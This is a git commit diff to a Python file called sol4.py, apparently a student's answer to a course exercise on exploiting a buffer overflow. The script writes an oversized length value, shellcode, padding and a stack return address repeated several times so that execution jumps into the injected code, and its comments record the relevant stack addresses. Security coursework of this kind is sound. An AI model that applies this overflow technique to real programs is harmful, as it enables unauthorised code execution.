e00e40b0c659651efbee84c7d4a349c45de32fda
jordynk <jordyn13470@gmail.com>
2024-04-03 05:43:25 +0000

    sol4

--- sol4.py
+++ sol4.py
@@ -5,6 +5,15 @@ import struct
 
 from shellcode import shellcode
 
-input = 0xE.to_bytes(8, "little")+shellcode
+input = 0xFFFFFFFFFFFFFFFF.to_bytes(8, "little")
 sys.stdout.buffer.write(input)
-#sys.stdout.buffer.write(shellcode)
+sys.stdout.buffer.write(shellcode)
+sys.stdout.buffer.write(b'A'*10)
+sys.stdout.buffer.write(0x7ffffff6ade0.to_bytes(8, "little"))
+sys.stdout.buffer.write(0x7ffffff6ade0.to_bytes(8, "little"))
+sys.stdout.buffer.write(0x7ffffff6ade0.to_bytes(8, "little"))
+sys.stdout.buffer.write(0x7ffffff6ade0.to_bytes(8, "little"))
+
+
+# start of shellcode: 0x7ffffff6addc
+# return address: 0x7ffffff6ae18
